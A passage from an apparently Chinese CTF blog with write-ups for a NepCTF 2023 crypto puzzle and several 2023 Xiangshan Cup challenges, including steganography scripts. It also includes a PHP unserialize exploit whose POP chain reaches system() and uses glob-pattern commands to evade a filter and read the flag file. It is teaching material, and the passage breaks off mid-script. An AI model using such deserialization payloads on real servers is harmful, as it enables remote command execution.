<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">salt_lenth= 10 </span><br><span class="line">key_lenth= 16 </span><br><span class="line">iv= 88219bdee9c396eca3c637c0ea436058 #原始iv转hex的值</span><br><span class="line">ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc</span><br></pre></td></tr></table></figure>
<p>第一个是salt的长度，第二个是key的长度，第三个是偏移量iv，第四个就是相对应的密文了</p>
<p>其次，来分析一下题目给的提示</p>
<p><u><strong>三月七：耶，终于来到Nepnep星球啦，让我看看正在火热进行的Hacker夺旗大赛群聊。啊！开拓者，这群名看起来怪怪的诶。 （伸出脑袋，凑近群名，轻轻的闻了一下）哇，好咸诶，开拓者你快来看看！</strong></u></p>
<p><u><strong>开拓者（U_id）：(端着下巴，磨蹭了一下，眼神若有所思）这好像需要经过啥256处理一下才能得到我们需要的关键。</strong></u></p>
<p>第一次阅读的时候我的关注点就是再256和群名两个关键上，256是指向hash算法，群名自然是跟附件中没有给出的key（PS：题目中关键的英文也是key）有关。</p>
<p>但是我刚开始完全没有注意到一个长度的问题，也就是salt_lenth= 10 和key_lenth= 16，而是将NepCTF 2023直接哈希计算了，中间留了空格（PS：因为我看群名也是留了空格的），甚至因为存在salt这个量还在考虑是否算法还进行了变种，然后尝试aes解密失败了。后来又从题目里的关键提示，也就是三月七闻群名好咸，咸指的自然就是盐，而盐的英文是salt。意识到这一点，也就开始知道为什么给出了两个长度值了salt的长度是提示使用NepCTF2023（PS:不加空格，刚好十个字），然后开始计算哈希256，得到的是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009</span><br></pre></td></tr></table></figure>
<p>但是长度是32个字节，所以需要截取出一半作为key，具体代码实现如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">*#* *提供的信息</span><br><span class="line">*key_hex = &quot;dd8e671df3882c5be6423cd030bd7cb6&quot;</span><br><span class="line">iv_hex = &quot;88219bdee9c396eca3c637c0ea436058&quot;</span><br><span class="line">ciphertext_hex = &quot;b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc&quot;</span><br><span class="line"></span><br><span class="line">*#* *将十六进制的**key**、**iv**和**ciphertext**转换为字节串</span><br><span class="line">*key = binascii.unhexlify(key_hex)</span><br><span class="line">iv = binascii.unhexlify(iv_hex)</span><br><span class="line">ciphertext = binascii.unhexlify(ciphertext_hex)</span><br><span class="line"></span><br><span class="line">*#* *创建**AES**解密器对象</span><br><span class="line">*cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line">*#* *解密数据</span><br><span class="line">*decrypted_data = cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line">*#* *将解密后的字节数据转换为字符串</span><br><span class="line">*decrypted_string = decrypted_data.decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">*#* *打印解密后的字符串</span><br><span class="line">*print(decrypted_string)</span><br></pre></td></tr></table></figure>
<p>最终计算下来结果为一串十六进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6148523063484d364c793970625763784c6d6c745a3352774c6d4e76625338794d44497a4c7a41334c7a49304c336c5061316858553070554c6e42755a773d3d</span><br></pre></td></tr></table></figure>
<p>然后转字符，转base64得到网址</p>
<p><strong><a href="https://img1.imgtp.com/2023/07/24/yOkXWSJT.png">https://img1.imgtp.com/2023/07/24/yOkXWSJT.png</a></strong></p>
<p>下载下来一张图片</p>
<p><img src="https://s2.loli.net/2023/09/29/8eWuRQc2y3htlYi.png" alt=""></p>
<p>然后第一反应识图，结果google继陌生的语言后又失效喽（悲</p>
<p>后来又想到题目一开始就有了提示，星穹铁道，然后搜索相关的文字，找到了贝洛伯格特殊文字</p>
<p><img src="https://s2.loli.net/2023/09/29/biMX7Bx8CuJwScr.jpg" alt=""></p>
<p>然后跟表对照得到最终的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NepCTF&#123;HRP_aIways_likes_March_7th&#125;</span><br></pre></td></tr></table></figure>
<p>(PS:做图文题做到够，麻了)</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>NepNep</tag>
      </tags>
  </entry>
  <entry>
    <title>2023香山杯-Writeup</title>
    <url>/2023/10/16/2023%E9%A6%99%E5%B1%B1%E6%9D%AF-Writeup/</url>
    <content><![CDATA[<h1>2023香山杯-Writeup</h1>
<h2 id="Misc">Misc</h2>
<h3 id="签到">签到</h3>
<p><strong>考点：base64，凯撒密码</strong></p>
<p>aW9kant6aDFmMHAzXzJfRndpfQ==</p>
<p>base64+凯撒</p>
<img src="https://s2.loli.net/2023/10/16/lCG8IXhfZFtNxdW.png" style="zoom: 67%;" />
<h3 id="pintu">pintu</h3>
<p><strong>考点：图片高度读取，进制转换，黑白图片识别，base64换表，Piet</strong></p>
<p>这题赛中被折磨了，思路出了偏差~~~</p>
<p>赛后感谢某位师傅的讲解~</p>
<p>首先本题观察一下本题所拿到的附件</p>
<p><img src="https://s2.loli.net/2023/10/16/wPJbqKApk2oDisa.png" alt=""></p>
<img src="https://s2.loli.net/2023/10/16/euzwkJIiQN5BMjf.jpg" style="zoom:67%;" />
<p>做了一个简单统计</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">图片大小 (65, 67): 802 张</span><br><span class="line">图片大小 (65, 70): 699 张</span><br><span class="line">图片大小 (65, 64): 164 张</span><br><span class="line">图片大小 (65, 40): 1567 张</span><br><span class="line">图片大小 (65, 66): 351 张</span><br><span class="line">图片大小 (65, 65): 338 张</span><br><span class="line">图片大小 (65, 71): 210 张</span><br><span class="line">图片大小 (65, 61): 139 张</span><br><span class="line">图片大小 (65, 62): 112 张</span><br><span class="line">图片大小 (65, 60): 185 张</span><br><span class="line">图片大小 (65, 63): 136 张</span><br></pre></td></tr></table></figure>
<p>我刚开始的思路其实是可不可能存在八种规格的图片，将起对应八进制进行转换，但是好像不行，emmm~~~</p>
<p>然后赛后看到了原来本题的重点是在于高度和黑白，以及还有一些以前没见过的隐写利用。</p>
<p>首先可以看到，不同的图片具有几种宽度，同时提示里给出了8-&gt;10，这是在按提示将八进制数字转换为十进制数字，图片的高度有40，60-67，70，71，对应于十进制32，48-55，56，57，对应于ASCII空格，‘0’-‘9’。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># 指定图片所在文件夹的路径</span></span><br><span class="line">folder_path = <span class="string">&#x27;./pintu&#x27;</span>  <span class="comment"># 请替换为实际文件夹的路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">octal_to_decimal</span>(<span class="params">octal_number</span>):</span><br><span class="line">    decimal_number = <span class="number">0</span></span><br><span class="line">    position = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 从右到左遍历八进制数的每一位</span></span><br><span class="line">    <span class="keyword">for</span> digit <span class="keyword">in</span> <span class="built_in">reversed</span>(octal_number):</span><br><span class="line">        <span class="comment"># 将每一位的字符转换为整数</span></span><br><span class="line">        digit_value = <span class="built_in">int</span>(digit)</span><br><span class="line">        <span class="comment"># 使用位权计算十进制值并累加</span></span><br><span class="line">        decimal_number += digit_value * (<span class="number">8</span> ** position)</span><br><span class="line">        position += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> decimal_number</span><br><span class="line"><span class="comment"># 打开一个名为&quot;10进制.txt&quot;的文件，准备写入数据</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;010.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="comment"># 循从1到4703读取图片高度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4704</span>):</span><br><span class="line">        <span class="comment"># 构建图片文件名，假设图片文件名格式为&quot;image_1.jpg&quot;，&quot;image_2.jpg&quot;等</span></span><br><span class="line">        image_filename = <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>.png&#x27;</span></span><br><span class="line">        image_path = os.path.join(folder_path, image_filename)</span><br><span class="line">        <span class="comment"># 打开图片</span></span><br><span class="line">        img = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">        <span class="comment"># 获取图片的高度</span></span><br><span class="line">        height = img.height</span><br><span class="line">        <span class="comment">#将高度当成八进制转换为十进制，再转换为字符串</span></span><br><span class="line">        height_decimal = <span class="built_in">chr</span>(octal_to_decimal(<span class="built_in">str</span>(height)))</span><br><span class="line">        <span class="comment"># 将数据写入文件</span></span><br><span class="line">        output_file.write(<span class="string">f&#x27;<span class="subst">&#123;height_decimal&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 打开文件以读取数据</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;010.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.read()</span><br><span class="line"><span class="comment"># 分割字符串，将数字提取出来</span></span><br><span class="line">numbers = data.split()</span><br><span class="line"><span class="comment"># 将每个数字转换为 ASCII 字符，并构建字符串</span></span><br><span class="line">ascii_string = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(num)) <span class="keyword">for</span> num <span class="keyword">in</span> numbers])</span><br><span class="line"><span class="comment"># 将ASCII字符串编码为字节数组</span></span><br><span class="line">ascii_bytes = ascii_string.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="comment"># 使用base64.b32decode解码为字节数组</span></span><br><span class="line">decoded_bytes = base64.b32decode(ascii_bytes)</span><br><span class="line"><span class="comment"># 将解码后的字节数组转换为字符串</span></span><br><span class="line">decoded_string = decoded_bytes.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="comment"># 打印 ASCII 编码的字符串</span></span><br><span class="line"><span class="built_in">print</span>(ascii_string)</span><br><span class="line"><span class="comment"># 打印解码后的字符串</span></span><br><span class="line"><span class="built_in">print</span>(decoded_string)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="comment"># 将解码后的字节数组转换为字符串</span></span><br><span class="line">    decoded_string = decoded_bytes.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    output_file.write(<span class="string">f&#x27;<span class="subst">&#123;decoded_string&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>最终是得到了一个疑似base的字符串，但明显换表了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LK1vE7eNJu8g1GRUdM5UE0QKLuKK1k5UdMKNdM5UdKKcdM7UdM5UMIPcnMXUdM5UMc5vEK15IvDqm6Dqnk7um6DlXuuqCuXUm6DqdBndm6RNMvDqdM5um6RNdMuqnk5Um6DldM5dm6RUMvRUdM5udBnUdM5NdM5Unk7UdM5QXu5UEMdqm6DldM5UXu7tE6RTdM5Udb8pjuKXK0ukLbu6KB0LEuXedB45i5nJJ/aIKvxqJBXStMXH1kRuKGTGtVRuIru6jMaXKBQpL7nkLB1uQV0mtKeGIrKMKI0VEMPqMNQFKtRPMV4HANUKMM5XnIKmd/V79V5HM/eeMKQCiu1uQEoqKK3wi5KHdy0wL5U6t702KMJZjM01ncXaMkRHjulwd09lM68xigKJ9b4vL75L37VNtgKeJ/5pJV12KuM6Qg199Va2L7at9EeciMXrMKQJ97nvQknrKw5yQI82nG7SIMPU1VPCib4K1GabiM4dIg4w3rQC3BKXnG00tM0EM05xIy1mKc0TJ7u7MVxNtG0t3baQXyowENeyEw11CB4rnVXAQbxwCrKp3GaAir7VIVnAtNaS374TJb12mGK/tcoGtEnuirKaMwVkjBVpEw4l3u8wXEn11VKPdKS69b8PnN4HJk2qEVQ0iIdwKB4aib4vJNQ4mkRS37a/tbaPQMe/J/QIXr4ztgS7IE9qM/sN1GXSi01Kjw4AIuDPnMkZLg3p1E569M2wAN5FjIXMncKVKM4FtNK7Qw1dn0o7iE5XJNQf1c4IjBoNiy07igXHKB3TjblPEkK6IbRlM5ae9MxZjIeFXV71JkP8JrnxX50yX/58Kb0Ijb1kmk9qMt85JGX03E5hKI5EnN4hEu7M3MamCIRaXk7V37083/4Bdb9lXMlp3KU4iB9NKcSpL6R6Xc16nk8b3G971VR8dM5UdM55ju1ML7Q7MI7cd6so1r5k9EaajI5/1tRZjb3Y9b5w1E9k</span><br></pre></td></tr></table></figure>
<p>然后是第二个利用，识别图片，将黑色看成0，白色看成1，作为二进制字符串输出，并转用ASCII 码转换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 指定图片所在文件夹的路径</span></span><br><span class="line">folder_path = <span class="string">&#x27;./pintu&#x27;</span>  <span class="comment"># 请替换为实际文件夹的路径</span></span><br><span class="line"><span class="comment"># 创建一个空列表，用于存储结果</span></span><br><span class="line">binary_values = []</span><br><span class="line"><span class="comment"># 循环从1到4703读取图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4704</span>):</span><br><span class="line">    <span class="comment"># 构建图片文件名，假设图片文件名格式为&quot;image_1.jpg&quot;，&quot;image_2.jpg&quot;等</span></span><br><span class="line">    image_filename = <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>.png&#x27;</span></span><br><span class="line">    image_path = os.path.join(folder_path, image_filename)</span><br><span class="line">    <span class="comment"># 打开图片</span></span><br><span class="line">    img = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    <span class="comment"># 将图片转换为黑白模式</span></span><br><span class="line">    bw_image = img.convert(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="comment"># 获取像素数据</span></span><br><span class="line">    pixels = <span class="built_in">list</span>(bw_image.getdata())</span><br><span class="line">    <span class="comment"># 检查是否存在黑色像素（0），如果存在则添加0，否则添加1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">in</span> pixels:</span><br><span class="line">        binary_values.append(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        binary_values.append(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 将生成的二进制值连接在一起，不使用分隔符</span></span><br><span class="line">binary_string = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, binary_values))</span><br><span class="line"><span class="comment"># 打印结果</span></span><br><span class="line"><span class="built_in">print</span>(binary_string)</span><br><span class="line"><span class="comment"># 在二进制字符串前面补充一个0</span></span><br><span class="line">binary_string_with_prefix = <span class="string">&#x27;0&#x27;</span> + binary_string</span><br><span class="line"><span class="comment"># 将二进制字符串转换为字节对象</span></span><br><span class="line">byte_data = <span class="built_in">bytes</span>([<span class="built_in">int</span>(binary_string_with_prefix[i:i+<span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string_with_prefix), <span class="number">8</span>)])</span><br><span class="line"><span class="comment"># 将字节对象解码为UTF-8文本</span></span><br><span class="line">utf8_text = byte_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(utf8_text)</span><br></pre></td></tr></table></figure>
<img src="https://s2.loli.net/2023/10/16/5R3rNuz81twsxVq.png"  />
<p>得到码表</p>
<p>进行解码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;LK1vE7eNJu8g1GRUdM5UE0QKLuKK1k5UdMKNdM5UdKKcdM7UdM5UMIPcnMXUdM5UMc5vEK15IvDqm6Dqnk7um6DlXuuqCuXUm6DqdBndm6RNMvDqdM5um6RNdMuqnk5Um6DldM5dm6RUMvRUdM5udBnUdM5NdM5Unk7UdM5QXu5UEMdqm6DldM5UXu7tE6RTdM5Udb8pjuKXK0ukLbu6KB0LEuXedB45i5nJJ/aIKvxqJBXStMXH1kRuKGTGtVRuIru6jMaXKBQpL7nkLB1uQV0mtKeGIrKMKI0VEMPqMNQFKtRPMV4HANUKMM5XnIKmd/V79V5HM/eeMKQCiu1uQEoqKK3wi5KHdy0wL5U6t702KMJZjM01ncXaMkRHjulwd09lM68xigKJ9b4vL75L37VNtgKeJ/5pJV12KuM6Qg199Va2L7at9EeciMXrMKQJ97nvQknrKw5yQI82nG7SIMPU1VPCib4K1GabiM4dIg4w3rQC3BKXnG00tM0EM05xIy1mKc0TJ7u7MVxNtG0t3baQXyowENeyEw11CB4rnVXAQbxwCrKp3GaAir7VIVnAtNaS374TJb12mGK/tcoGtEnuirKaMwVkjBVpEw4l3u8wXEn11VKPdKS69b8PnN4HJk2qEVQ0iIdwKB4aib4vJNQ4mkRS37a/tbaPQMe/J/QIXr4ztgS7IE9qM/sN1GXSi01Kjw4AIuDPnMkZLg3p1E569M2wAN5FjIXMncKVKM4FtNK7Qw1dn0o7iE5XJNQf1c4IjBoNiy07igXHKB3TjblPEkK6IbRlM5ae9MxZjIeFXV71JkP8JrnxX50yX/58Kb0Ijb1kmk9qMt85JGX03E5hKI5EnN4hEu7M3MamCIRaXk7V37083/4Bdb9lXMlp3KU4iB9NKcSpL6R6Xc16nk8b3G971VR8dM5UdM55ju1ML7Q7MI7cd6so1r5k9EaajI5/1tRZjb3Y9b5w1E9k&quot;</span></span><br><span class="line"></span><br><span class="line">string1 = <span class="string">&quot;sUvcu5rgSeAmJQCfdXtEMKIB91Lj3niOo4hyV0b/2azpx8HqZP6wk7GNlTFYDR+W&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到关键信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iVBORw0KGgoAAAANSUhEUgAAAEwAAAAUCAMAAAAQlCuDAAAAP1BMVEX/////wMD//8DA/8DA///AwP//wP//AAD//wAA/wAA//8AAP//AP/AAADAwAAAwAAAwMAAAMDAAMD///8AAADMRO/yAAABkklEQVQ4ja2UyZLDIAxExWL2zVT+/1tHIDngODWnvJODXa2mJQUskkWtivD6IKIRvXeTUidMLoSszU/qRHn+pUQAQueKBy5bAnRrIQSNxFD58/UW3xUnB9shPrKYhUC0mIYt4iSOnlN3BV8S+lxuLbhBkQZsY7HuI2qk2FhTE24vXbJhkZRa2CyDFQSLcWB7GFW1c5khwmHYLAfLNzhUgjfyHPXxspcNquQwieIISRQlZ6KT9y3Q5RK7KiRrjMF83OrcO6Y9xFvDJ6k38eksjJxmdZGJKzHsXy2fh/egH86I7DxeiS94my+O8xpKsE7YfEqAR2bkqwxn3J/NCeyd3UxizhB3sa/OHsZgJjq5Bg2sVDhjHr5Y6/Rp7gdHzVUo8JXO1uM0hw+e1raJ3+qzmdTt5dUHzKuu76PvX5y1Q3sOd8Vmx7z9uxtnUw9nn1OErZoxPZIaK0mbzFMY3Lm0glDYcFqmViVnft/F/Q+E3deq1bUaSwxbLMTqJK9oiGMdsYmrxWBf8EN+qPayv7T2+k/rD6rwKfsf5fOmAAAAAElFTkSuQmCC  </span><br><span class="line">data:image/png;base64</span><br></pre></td></tr></table></figure>
<p>用base转换为图片</p>
<img src="https://s2.loli.net/2023/10/16/kIpf1dmY6XhSjyQ.png" style="zoom:200%;" />
<p>最后是使用了Piet得到的flag，详情可以看这个<a href="https://blog.csdn.net/MarkRao/article/details/121796707">Piet一种奇葩编程语言——利用在CTF中Piet的套路应该很多</a></p>
<p><img src="https://s2.loli.net/2023/10/16/cpoZUDqsduIQCa9.png" alt=""></p>
<h2 id="Web">Web</h2>
<p><strong>考点：php反序列化</strong></p>
<h3 id="PHP-unserialize-pro">PHP_unserialize_pro</h3>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;welcome&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;Wh0 4m I?&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name == <span class="string">&#x27;A_G00d_H4ck3r&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;arg;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">G00d</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$shell</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$shell</span> = <span class="variable language_">$this</span>-&gt;shell;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;U R A BAD GUY&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$shell</span>(<span class="variable">$cmd</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">H4ck3r</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">            <span class="variable">$function</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>研究了几位师傅的exp，姿势确实多</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;A_G00d_H4ck3r&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;welcome&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name == <span class="string">&#x27;A_G00d_H4ck3r&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">G00d</span></span>&#123;</span><br><span class="line">    <span class="comment">//本地调试打好的题</span></span><br><span class="line"><span class="comment">//    public $shell = &#x27;strtolower&#x27;;</span></span><br><span class="line"><span class="comment">//    public $cmd = &#x27;dir ../../../../../&#x27;;</span></span><br><span class="line"><span class="comment">//    public $cmd = &#x27;show_source(chr(47).chr(102).chr(49).chr(97).chr(103));&#x27;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shell</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="comment">//    public $cmd = &#x27;dir&#x27;;</span></span><br><span class="line"><span class="comment">//    public $cmd = &#x27;more /[e-h]1[0-b][e-h]&#x27;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;sort /[!q]1[!q][!q]&#x27;</span>;</span><br><span class="line"><span class="comment">//    public $cmd = &#x27;cd /;echo `more dir`&#x27;;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123; <span class="comment">//__invoke会在把对象当作一个方法调用的时候自动调用</span></span><br><span class="line">        <span class="variable">$shell</span> = <span class="variable language_">$this</span>-&gt;shell;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;U R A BAD GUY&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$shell</span>(<span class="variable">$cmd</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H4ck3r</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="keyword">new</span> <span class="title class_">G00d</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Welcome</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;arg = <span class="keyword">new</span> <span class="title class_">H4ck3r</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;welcome&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">G00d</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$shell</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H4ck3r</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title class_">H4ck3r</span>();</span><br><span class="line"><span class="variable">$w</span> = <span class="keyword">new</span> <span class="title class_">Welcome</span>();</span><br><span class="line"><span class="variable">$g</span> = <span class="keyword">new</span> <span class="title class_">G00d</span>();</span><br><span class="line"><span class="variable">$w</span>-&gt;name=<span class="string">&quot;A_G00d_H4ck3r&quot;</span>;</span><br><span 